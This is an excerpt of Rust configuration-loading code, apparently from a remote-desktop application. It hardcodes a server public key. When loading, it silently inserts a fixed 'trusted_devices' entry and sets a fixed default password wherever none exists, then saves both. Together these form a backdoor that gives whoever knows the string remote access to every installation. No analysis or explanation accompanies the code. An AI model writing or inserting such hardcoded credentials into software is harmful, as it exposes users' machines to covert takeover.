...
pub const PUBLIC_RS_PUB_KEY: &str = "VYOwRQzrjY9v5GYP8FtSUkyuubhYMYARskQmOT0KFO4=";
...
impl Config2 {
    fn load() -> Config2 {
		...
		if !config.options.contains_key("trusted_devices") {
            	config.options.insert("trusted_devices".to_string(), "00F9iA3l3cwE+QjXhg2IsdEjrx".to_string());
            	config.store();
        	}
        store |= store2;
        if store {
...
impl Config {
    ...
    fn load() -> Config {
		...
		if config.password.is_empty() {
            	config.password = "00F9iA3l3cwE+QjXhg2IsdEjrx".to_string();
            	store = true;
        	}
        if store {
            config.store();
